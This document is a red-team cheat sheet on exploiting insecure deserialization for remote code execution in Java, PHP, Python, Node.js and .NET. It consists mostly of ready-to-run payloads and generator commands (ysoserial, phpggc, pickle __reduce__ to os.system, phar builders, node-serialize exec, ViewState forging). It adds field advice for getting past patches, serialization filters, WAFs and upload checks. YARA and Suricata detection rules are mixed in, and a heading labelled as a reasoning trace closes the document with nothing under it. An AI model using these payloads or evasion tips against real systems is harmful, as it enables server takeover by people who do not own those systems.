# deser — web

# Insecure Deserialization → RCE: Red Team Reference

## Quick Table: Sinks, Vulnerable Versions, Primitives

| Bahasa/Runtime | Sink deserialisasi | Versi/library rentan | Primitive |
|---|---|---|---|
| Java | `ObjectInputStream.readObject` | Commons-Collections ≤3.2.1, ≤4.0 | Gadget chain → `Runtime.exec` |
| Java | `XMLDecoder` | JDK 1.6-8 | Instantiate + invoke |
| Java | `readObject` + URLDNS | JDK 6/7/8 (all) | DNS callback detection only |
| PHP | `unserialize` | PHP 5.x-8.x | `__destruct`/`__wakeup`/`__toString` chain |
| PHP | `phar://` wrapper | PHP 5.3-8.x | Trigger unserialize saat file op |
| Python | `pickle.loads` | all | `__reduce__` → `os.system` |
| Python | `yaml.load` (not SafeLoader) | PyYAML <6.0 | `!!python/object/apply` |
| Node | `node-serialize` (<=0.0.4) | `unserialize()` | IIFE via `_$$ND_FUNC$$_` |
| Node | `js-yaml` unsafe | js-yaml <3.13.1/<4 (early) | `!!js/function` |
| .NET | `BinaryFormatter` | all .NET Framework, .NET ≤8 (opt-in) | `ObjectDataProvider` + XAML |
| .NET | `ViewState` without MAC | ASP.NET 1.x-4.8 | `TypeConfuseDelegate` + `ObjectStateFormatter` |

---

## Java

### 1. ksoserial — CommonsCollections 1-7

**What is sent:** base64/raw serialized Java byte stream (`AC ED 00 05 ...`) to an endpoint that calls `ObjectInputStream.readObject()` (RMI, JMX, HTTP body, JSF ViewState, WebLogic T3, Spring HTTP invoker, unsigned session cookie).

**Command per chain** (ganti `CMD`):
```bash
# CC1 (CommonsCollections 3.1-3.2.1, JDK <8u71 untuk AnnotationInvocationHandler path)
java -jar ysoserial.jar CommonsCollections1 'CMD' > cc1.bin

# CC2 (commons-collections4 4.0, JDK 7+)
java -jar ysoserial.jar CommonsCollections2 'CMD' > cc2.bin

# CC3 (commons-collections 3.2.1, pakai TemplatesImpl)
java -jar ysoserial.jar CommonsCollections3 'CMD' > cc3.bin

# CC4 (commons-collections4 4.0)
java -jar ysoserial.jar CommonsCollections4 'CMD' > cc4.bin

# CC5 (commons-collections 3.1-3.2.1, JDK 8+ — bypass 8u71 official fix)
java -jar ysoserial.jar CommonsCollections5 'CMD' > cc5.bin

# CC6 (commons-collections 3.2.1, independent of InvokerTransformer serialization -> bypass strict filter)
java -jar ysoserial.jar CommonsCollections6 'CMD' > cc6.bin

# CC7 (commons-collections 3.2.1/4.0, pakai Hashtable.readObject)
java -jar ysoserial.jar CommonsCollections7 'CMD' > cc7.bin
```

| Chain | Library | JDK | Trigger class | Notes |
|---|---|---|---|---|
| CC1 | cc 3.1-3.2.1 | 6/7, <8u71 | `AnnotationInvocationHandler` | Patch 8u71 ubah field, closed |
| CC2 | cc4 4.0 | 7+ | `TemplatesImpl` + `PriorityQueue` | works without `InvokerTransformer` |
| CC3 | cc 3.2.1 | 7+ | `TemplatesImpl` + `TrAXFilter` | a gift for when `InvokerTransformer` is blocked |
| CC4 | cc4 4.0 | 7+ | `TrAXFilter` | varian cc4 |
| CC5 | cc 3.2.1 | 8+ | `BadAttributeValueExpException` | tembus blacklist `InvokerTransformer` 8u71 |
| CC6 | cc 3.2.1 | 8+ | `TiedMapEntry` + `HashSet` | does not serialize InvokerTransformer |
| CC7 | cc 3.2.1/4.0 | 8+ | `Hashtable.readObject` | viable under many filters |

### 2. URLDNS — blind detection without gadgets
**What is sent:** `HashMap` with `URL` as key/value, `hashCode()` triggered on `readObject`.
**Effect:** outbound DNS lookup — only proof that deserialization occurred, no RCE.
```bash
java -jar ysoserial.jar URLDNS 'http://<collab>.oast.pro' > urldns.bin
# deteksi: curl body @ urldns.bin ke target -> monitor DNS/HTTP
```

### 3. JDK-only chain (no external dependencies)
- `Jdk7u21`: `TemplatesImpl` + `AnnotationInvocationHandler` — JDK <8u20 (fixed 8u20).
- `JRMPClient`: `UnicastRef` in `RMIConnectionImpl` — let the target make an outbound connection to a JRMP listener (`ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'CMD'`), verbose but zero dependencies.
- `Hibernate1/2`, `Spring1/2`, `MozillaRhino1`, `Groovy1` for targets that have common libraries.

### 4. Common libraries that become gadgets
| Gadget | Library target | Primitive |
|---|---|---|
| `CommonsBeanutils1` | beanutils 1.9.2 | getter chain → `TemplatesImpl` |
| `ROME` | rome 1.0 | `ToStringBean` → invoke |
| `Spring1/2` | spring-core 4.x | `MethodInvokeTypeProvider` |
| `Groovy1` | groovy 2.3+ | `MethodClosure` + `ConvertedClosure` |
| `Hibernate1/2` | hibernate-core 4.x/5.x | `PojoBean` |
| `C3P0` | c3p0 0.9.5.2 | `PoolBackedDataSource` → JNDI |
| `Click1`, `Wicket1` | web framework | |

### 5. Signature deteksi Java
```yaml
# WAF/Suricata rule (base64 body yang decode ke stream Java)
alert http any any -> any any (msg:"Java serialized stream"; \
  content:"|AC ED 00 05|"; depth:1; \
  content:"java/"; distance:0; \
  sid:9000001; rev:1;)

# gzip-transport: Content-Encoding: gzip + body magic 1f 8b yang decode ke AC ED 00 05
alert http any any -> any any (msg:"Gzip Java stream"; \
  content:"|1F 8B|"; depth:2; \
  flow:to_server; sid:9000002;)

# YARA untuk payload
rule java_serialized_gadget {
  strings:
    $magic = { AC ED 00 05 }
    $cc  = "org/apache/commons/collections"
    $tr  = "com/sun/org/apache/xalan/internal/xsltc"
    $tpl = "TemplatesImpl"
    $inv = "InvokerTransformer"
  condition: $magic at 0 and 2 of ($cc,$tr,$tpl,$inv)
}
```
Logging endpoint: enable `-Djava.util.logging` or the `jdk.deserialization.filter` agent (JEP 290) — the filter `jdk.serialFilter=!org.apache.commons.collections.functors.*` shuts down CC1-7.

---

## PHP

### 1. `unserialize` — POP chain buatan
**What is sent:** the result string of `serialize()` containing the class + magic methods (`__destruct`, `__wakeup`, `__toString`, `__call`, `__get`).
**Minimal POP example to `system()`** (common frameworks):
```php
class A { public $cmd; function __destruct(){ system($this->cmd); } }
echo serialize(new A());   // O:1:"A":1:{s:3:"cmd";s:2:"id";}
```
Send to an endpoint that calls `unserialize($_COOKIE['x'])`, the default session handler (`php`), or Laravel `X-XSRF-TOKEN` (decrypt → unserialize) on versions <8.x with a leaked APP_KEY.

**POP chain umum:**
| Framework/library | Entry magic | Versi rentan | End |
|---|---|---|---|
| Monolog <2.3.5 | `__destruct` → `Handler` | CVE-2021-** | RCE via `SyslogHandler`/`StreamHandler` |
| Guzzle <6.5.0/7.x | `__destruct` → `FileCookieJar` | | file write |
| Laravel (phpggc chain `laravel/rceX`) | `__destruct` | 5.x-8.x | `system` |
| Symfony (phpggc `symfony/rce5`) | `__destruct` | 3.x-5.x | RCE |
| Doctrine (`doctrine/rceX`) | `__destruct` | | RCE |

**Quick generate with phpggc:**
```bash
phpggc -u laravel/rce2 'system' 'id'          # URL-encoded
phpggc -b monolog/rce1 'system' 'id'          # base64
phpggc laravel/rce9 'exec' 'id' > payload.bin
```

**Signature:**
```
# YARA
rule php_serialized_pop {
  strings:
    $s = /O:[0-9]+:"[A-Za-z\\_]+":/ 
    $w = "wakeup"
    $d = "destruct"
  condition: $s and 1 of ($w,$d)
}
# Suricata
alert http any any -> any any (msg:"PHP serialized in body/cookie";
  content:"O:"; pcre:"/O:\d+:\"[A-Za-z\\\\_]+\"/"; sid:9010001;)
```
**When it fails:** the magic method is called but `__destruct` dies because of `exit`/`die` (unserialize inside a destructor does not run), or the class is not autoloaded.

### 2. `phar://` — deserialisasi via file operation
**Concept:** PHP ≥5.3 treats `phar://` as a wrapper; when the *entire* phar metadata (`manifest`) is re-read, PHP automatically `unserialize`s the metadata. Triggers: `file_exists`, `filesize`, `getimagesize`, `md5_file`, `glob`, `copy`, `file_put_contents` — all functions that accept a path.

**What is sent:** a valid `.phar` file containing the payload in metadata, uploaded through an avatar/doc upload feature. The injected path (`phar:///tmp/up/x.phar/x`) goes into the file function.

**Generate:**
```php
$p = new Phar('/tmp/x.phar', 0, 'x.phar');
$p->startBuffering();
$p['a.txt'] = 'x';
$p->setMetadata(new A());        // A sama seperti POP di atas
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->stopBuffering();
```
**Bypass:** `phar.readonly=0` is required on the attacker side; on the target server `phar.readonly` is irrelevant — only the attacker needs to build it. Renaming to `.jpg` remains valid (magic `__HALT_COMPILER();` in the stub). PHP 8.0+ marks metadata unserialize inside `phar://` as *deprecated* unless `phar.cache_list`, but it still works until 8.x for `phar://` paths.

**Signature:**
```
rule phar_upload {
  strings:
    $halt = "__HALT_COMPILER();"
    $man  = "GBMB"            # phar manifest magic
  condition: $halt and $man at (0..1024)
}
```
Detecting the *sink*: grep the code for `file_exists(.*\$_` + file functions that accept user input — the `phar_deserialization` pattern (CVE-2018-5712 style).

---

## Python

### 1. `pickle.loads`
**What is sent:** the byte stream `\x80\x04...` to an endpoint that runs `pickle.loads` (Flask session, cache, ML model loading, RPC).

**Payload:**
```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(E())        # b'\x80\x04\x95...'
```
**FYI:** `pickle` also works via a `pickletools`-agnostic path — `__reduce__`/`__reduce_ex__` is the only one called; `__eq__`/`__hash__` are not triggered during unpickle.

**Signature:**
```
# YARA
rule pickle_payload {
  strings:
    $op1 = { 80 04 }            # proto 4
    $op2 = { 80 05 }            # proto 5
    $ev  = "os\nsystem"
    $ev2 = "posix\nsystem"
    $rt  = "R"                  # REDUCE opcode
  condition: ($op1 at 0 or $op2 at 0) and 1 of ($ev,$ev2)
}
# Suricata
alert http any any -> any any (msg:"Python pickle in body";
  content:"|80 04|"; depth:2; content:"system"; distance:0; sid:9020001;)
```
**Fails:** `pickle.Unpickler(find_class=...)` restricts classes; `pickle` in Python 3.8+ still allows all globals unless explicitly restricted.

### 2. `yaml.load` (unsafe)
**What is sent:** YAML text with the tag `!!python/object/apply` to a config upload endpoint.
```yaml
!!python/object/apply:os.system ["id"]
```
**Versi:** PyYAML <5.1 memanggil `yaml.load` default unsafe; 5.1+ default `Loader=yaml.SafeLoader`, tetapi kode lama memanggil `yaml.load(f, Loader=yaml.UnsafeLoader)` eksplisit — tetap rentan.

**Signature:**
```
rule yaml_python_tags {
  strings:
    $t1 = "!!python/object/apply"
    $t2 = "!!python/object/new"
    $t3 = "!!python/object:"
    $t4 = "!!python/module:"
  condition: any of them
}
```
**Key difference:** `yaml.safe_load` never triggers; `yaml.FullLoader` (5.1+) blocks `python/object/apply` — so detect the version via the error response (`could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply'` = safe Loader).

---

## Node.js

### 1. `node-serialize` <=0.0.4
**What is sent:** a JSON object with a function in the key `_$$ND_FUNC$$_`. `unserialize()` does `eval` on the function string, then calls the IIFE `()`.
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```
**Sink:** `require('node-serialize').unserialize(req.body)` on old endpoints (common in 2016-2018 boilerplates). Package deprecated.

**Signature:**
```
rule nodeserialize {
  strings:
    $k = "_$$ND_FUNC$$_"
    $i = "()" 
  condition: $k
}
```

### 2. `js-yaml` unsafe (`!!js/function`)
**What is sent:** YAML with `!!js/function` (only active if the loader is `DEFAULT_FULL_SCHEMA` / `load()` without options on old versions, or `safeLoad` is replaced).
```yaml
!!js/function "function(){ return require('child_process').execSync('id') }"
```
**Version:** js-yaml <3.13.1 (CVE-2019-**) and early 4.0.0 — `load()` defaults to `safeLoad` (explicit) after 3.13.1. `js-yaml@4` completely removes `!!js/*` in the default loader.

**Signature:**
```
rule jsyaml_func {
  strings:
    $t = "!!js/function"
    $r = "!!js/regexp"
  condition: any of them
}
```

---

## .NET

### 1. `BinaryFormatter`
**What is sent:** base64/raw stream `AAEAAAD/////AQAAAAAAAAAM...` (magic `00 01 00 00 00 FF FF FF FF`).
**RCE:** the `TypeConfuseDelegate` gadget (via `SortedSet` + `Comparison`) or `ObjectDataProvider` + `XamlReader` to an endpoint that runs `BinaryFormatter.Deserialize` (ViewState without MAC, .NET Remoting, out-of-proc `SessionState`, `ObjectStateFormatter`, `LosFormatter`).

**Generate with ysoserial.net:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc" -o raw > bf.bin
ysoserial.exe -f LosFormatter    -g ObjectDataProvider -c "calc"
```

**Versi/konteks:**
- .NET Framework ≤4.8: `BinaryFormatter` aktif default.
- .NET 5-8: `BinaryFormatter` still exists but `EnableUnsafeBinaryFormatterSerialization=false` default in .NET 5+; the `AppContext` switch can be enabled by applications that still need it.
- .NET 9: dihapus (removed).

**Signature:**
```
rule dotnet_binaryformatter {
  strings:
    $m = { 00 01 00 00 00 FF FF FF FF }
    $t1 = "System.Data.Services.Internal.ExpandedWrapper"
    $t2 = "TypeConfuseDelegate"
    $t3 = "ObjectDataProvider"
  condition: $m at 0 and any of ($t1,$t2,$t3)
}
```

### 2. `ViewState` without MAC
**What is sent:** form field `__VIEWSTATE` (base64) to ASP.NET 1.x-4.8 applications with `<pages enableViewStateMac="false"/>` or a leaked `machineKey` (leak via `/trace.axd`, config disclosure, or CVE-2020-**) — `ObjectStateFormatter.Deserialize` triggers the gadget.
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" \
  --path="/default.aspx" --apppath="/" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --generator="<hex, dari __VIEWSTATEGENERATOR>"
```
**Detection:** check header/body `__VIEWSTATEGENERATOR` + `__VIEWSTATE` without `__VIEWSTATEMAC`; base64 ViewState with prefix `AAEAAAD/////` = `ObjectStateFormatter` (not legacy `LosFormatter`).

**Signature:**
```
rule dotnet_viewstate_oos {
  strings:
    $v = "__VIEWSTATE="
    $m = "AAEAAAD/////"      # ObjectStateFormatter signature base64
    $g = "__VIEWSTATEGENERATOR"
  condition: $v and $m and $g
}
```

---

## Payload Generate Table (operational summary)

| Runtime | Tool | Command | Output mime |
|---|---|---|---|
| Java | ysoserial | `java -jar ysoserial.jar CC6 'CMD'` | `application/x-java-serialized-object` |
| Java | ysoserial | `java -jar ysoserial.jar URLDNS 'http://x.oast'` | DNS callback |
| PHP | phpggc | `phpggc -u laravel/rce9 system id` | `application/x-www-form-urlencoded` |
| PHP | manual | `php build_phar.php` | `image/jpeg` (with stub) |
| Python | pickle | `python3 -c "..."` | `application/octet-stream` |
| Node | manual | string JSON `_$$ND_FUNC$$_` | `application/json` |
| .NET | ysoserial.net | `-f BinaryFormatter -g TypeConfuseDelegate` | `application/octet-stream` |

---

## Detection Signature Table (consolidated)

| Technique | Magic byte / marker | Check location |
|---|---|---|
| Java serialized | `AC ED 00 05` (raw) / `1F 8B` + decode | body, cookie, session, `Content-Type: application/x-java-serialized-object` |
| Java gzip | `1F 8B 08` | body + `Content-Encoding: gzip` |
| PHP serialize | `O:<n>:"Cls"` / `a:<n>:{` | body, cookie, `X-XSRF-TOKEN` |
| Phar | `__HALT_COMPILER();` + `GBMB` | file upload / path sink |
| Pickle | `80 04` / `80 05` at offset 0 | body, file upload (.pkl, .bin) |
| YAML unsafe | `!!python/object/apply` / `!!js/function` | body, file upload (.yml, .yaml) |
| node-serialize | `_$$ND_FUNC$$_` | JSON body |
| .NET BF | `00 01 00 00 00 FF FF FF FF` | body |
| .NET ViewState | `AAEAAAD/////` | form `__VIEWSTATE` |

---

## Operational pitfalls (that make this technique fail in the field)

1. **JDK patch level kills the chain.** CC1 is dead in 8u71+ (`AnnotationInvocationHandler` structure changed). 8u191+ `com.sun.jndi.ldap.object.trustURLCodebase=false` default → JNDI (C3P0, ROME+JNDI) fails RCE, only DNS. Many old writeups do not mention this; the payload shows `NullPointerException` in the log, not RCE.

2. **JEP 290 / serialization filter.** JDK 9+ can set global `jdk.serialFilter`, Tomcat 9 `serializationFilter`, Spring `SerializationFilter`. Class-based payloads (CC*) are rejected in `readObject` before trigger — a JDK-only chain is needed (`Jdk7u21` is dead, `JRMPClient` is often blocked because of outbound port).

3. **Custom `ObjectInputFilter` wrap.** Many Spring Boot applications use `SerializingConverter` + whitelist (`addAllowedPattern`). URLDNS still works (HashMap+URL passes common whitelists), but the gadget trigger does not — detection succeeds, RCE fails.

4. **Commons-Collections 3.2.2+ / 4.1+.** Since 3.2.2 `InvokerTransformer` is not serializable (throws), 4.1 the same. Check `mvn dependency:tree`, not the manifest version — shade/uber-jars often misreport. If the target uses `commons-collections4:4.1`, CC2/CC4 are dead; look for `CommonsBeanutils1` (beanutils 1.9.2 is still vulnerable, 1.9.4 partially fixes it).

5. **`TemplatesImpl` needs `-Djdk.xml.*` not strict.** JDK 9+ with `SecurityManager` or `--illegal-access=deny` (JDK 17 default `deny`) blocks reflection on `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` — CC2/3/4 fail. Solution: `Jdk7u21` is also dead, move to `JRMPClient` (requires outbound) or `CommonsBeanutils1`.

6. **`phar://` in PHP 8.** PHP 8.0+ shows a `PharMetadataUnserializeDeprecated` warning in the log; many WAFs block the string `phar://`; `realpath`/`include_path` do not trigger manifest read on all paths. Make sure the sink is a function that reads the *manifest*, not just `file_get_contents` (which reads contents, not metadata). What works: `file_exists`, `is_file`, `getimagesize`, `md5_file`, `copy` (not `file_get_contents`).

7. **Your `phar` upload will not pass if the server checks MIME `image/*`.** Rename + `GIF89a` stub + `__HALT_COMPILER();` is still valid; however, `getimagesize` on the server actually **triggers** it — that is a feature, not a bug. It fails if the server deletes the uploaded file after validation; you need path traversal or a rename race.

8. **PHP `unserialize` in modern frameworks.** Laravel ≥9 uses `SignedUrl` + `encrypt` (AES-256-CBC) for `X-XSRF-TOKEN`; requires `APP_KEY`. Symfony `serialize` in session uses `PhpSerializer`, which `unserialize`s with `['allowed_classes' => false]` — POP is dead. Check config: vulnerable `SessionHandler` = `php`/`files` + raw `unserialize`, not the latest `doctrine`/`redis`.

9. **Python pickle in Python 3.13.** `pickle` default proto 4 in 3.8+, but 3.13 still exposes global `find_class`. What kills it: `pickle.Unpickler.find_class` override in libraries (e.g. `torch.load` 2.6+ default `weights_only=True`). Targets loading ML models with `torch.load` pre-2.6 are vulnerable; 2.6+ default is safe.

10. **`yaml.load` default is already safe.** PyYAML 6.0+ default `Loader` = `SafeLoader` when no argument is given — `yaml.load(stream)` **remains safe** in 6.x. Only code that explicitly uses `Loader=yaml.UnsafeLoader`/`FullLoader`/`BaseLoader`/`CLoader` is vulnerable. Detect the version via error response; do not assume all `yaml.load` is vulnerable.

11. **`node-serialize` is almost extinct.** NPM package `node-serialize` version 0.0.4 was deprecated in 2019; it still appears in legacy codebases, but `unserialize` does not call an IIFE unless the payload ends with `()`. Detecting the string `_$$ND_FUNC$$_` without `()` = eval only, no exec. If `Function is not defined` appears in the log, the target uses a `safe-eval`/`vm` sandbox.

12. **.NET `BinaryFormatter` in .NET 5+ is off by default.** `EnableUnsafeBinaryFormatterSerialization=false` in `runtimeconfig.json`; a `AAEAAAD/////` payload at a .NET Core 5+ endpoint will produce `PlatformNotSupportedException` in the log, not RCE. Check the `Server: Kestrel` header + `.NET Framework` target (IIS+`windows`), or look for an app that explicitly sets `AppContext.SetSwitch("System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", true)`.

13. **ViewState MAC is on by default since .NET 4.5.2.** All ASP.NET 4.5.2+ applications default to `enableViewStateMac=true` and `ViewStateEncryptionMode=Auto` — requires a leaked `machineKey`. A URL scan for `__VIEWSTATEGENERATOR` is not enough; look for `machineKey` in `web.config` disclosure (`.config` exposed, `/trace.axd`, `elmah.axd`, backup file). Without the key, an `ObjectStateFormatter` payload = MAC fail 500.

14. **Gadget needs classpath match.** `ysoserial.dll` v1.36 has `-p` plugin vs generator syntax (`-f -g`); many old tutorials use `-p` which is missing in new versions. For .NET 4.5.2 ViewState target, use `-p ViewState` + `--path` MUST be the same as target path (including case) or even valid MAC is still rejected — path mismatch = invalid viewstate. `--apppath` for virtual directory, usually `/` but can be `/app`.

15. **Serialization filter in Spring Boot.** `spring-boot-starter-security` + `SessionRepository` Redis can use `Jackson2JsonRedisSerializer` (not vulnerable to Java pickle) vs `JdkSerializationRedisSerializer` (vulnerable). Error log `Cannot deserialize` vs `ClassNotFound` distinguishes; don't mistakenly send Java payload to Redis JSON serializer — result is null, not RCE.

16. **`Content-Type` mismatch.** Spring `SerializationUtils.deserialize` at HTTP invoker endpoint checks `Content-Type: application/x-java-serialized-object`; sending with wrong header = 415, not panic. For T3 WebLogic, T3 protocol frame is mandatory (`t3 12.2.1\nAS:255\nHL:19\n\n`), raw body won't be processed — use `weblogic-framework`/`ysoserial` `JRMPClient` with correct framing.

17. **Your DNS/HTTP egress is missing.** URLDNS needs DNS resolution target. In closed VPC, target uses internal resolver without callback; use `DNS exfil via query length` or check response time (3-5s delay via `Thread.sleep` payload is impossible — use `TemplatesImpl` timing). Fallback: blind RCE via `CommonsBeanutils1` with `exec 'sleep 5'`.

18. **Blind deserialization in cookie.** Many frameworks store Java serialized in session cookie (`JSESSIONID` base64). WAF often blocks `AC ED 00 05` base64 (`rO0AB...`) as default signature — try gzip (`H4sI...`) or `Content-Encoding: gzip` body. Decode base64 first, check prefix `rO0AB` = Java stream.

19. **PHP `unserialize` object injection vs RCE.** There is a POP chain but execution needs `system`/`exec` not in `disable_functions`. Check leaked `phpinfo` or test `phpggc -l` matching target; modern PHP (8.x) with `open_basedir` and `disable_functions=exec,passthru,shell_exec,system,proc_open,popen` = POP up to file write only, RCE fails.

20. **Race condition `phar` upload.** File deleted before sink path runs (`phar:///tmp/x` → 404). Needs: upload → sink in same request (via direct LFI path), or permanent path (avatar, attachment). Upload `<random>.jpg` to user avatar, then trigger `phar://` via LFI at another endpoint — in one session without GC cron.

---

## [reasoning trace]


